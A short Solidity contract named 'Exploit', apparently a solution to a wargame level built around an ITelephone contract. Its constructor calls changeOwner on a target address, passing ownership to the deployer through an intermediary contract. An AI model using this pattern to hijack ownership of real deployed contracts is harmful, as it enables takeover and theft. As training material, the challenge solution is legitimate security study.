// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface ITelephone{
    function owner() external view returns (address);
    function changeOwner(address) external;
}

contract Exploit{
    constructor(address _target){
        ITelephone(_target).changeOwner(msg.sender);
    }
}